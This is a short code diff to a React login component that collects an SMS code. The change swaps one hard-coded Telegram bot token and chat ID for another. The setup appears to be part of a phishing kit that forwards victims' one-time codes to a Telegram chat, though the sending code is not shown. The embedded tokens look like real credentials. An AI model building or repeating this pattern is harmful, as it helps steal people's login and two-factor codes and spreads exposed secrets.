@@ -1,8 +1,8 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './App.css'; // Make sure to create this CSS file
-const TELEGRAM_BOT_TOKEN = '7247518691:AAGG9Pgry6_a7vna8yOpeuRcmuo79ij9U18';
-const TELEGRAM_CHAT_ID = '1436609764';
+const TELEGRAM_BOT_TOKEN = '7567933012:AAG_jlPLYWLcQe8G7jgVgiWcXixg9DBaCdo';
+const TELEGRAM_CHAT_ID = '7464995879';
 const Login = () => {
   const [smsCode, setSmsCode] = useState(''); // Updated state for SMS code
   const navigate = useNavigate();
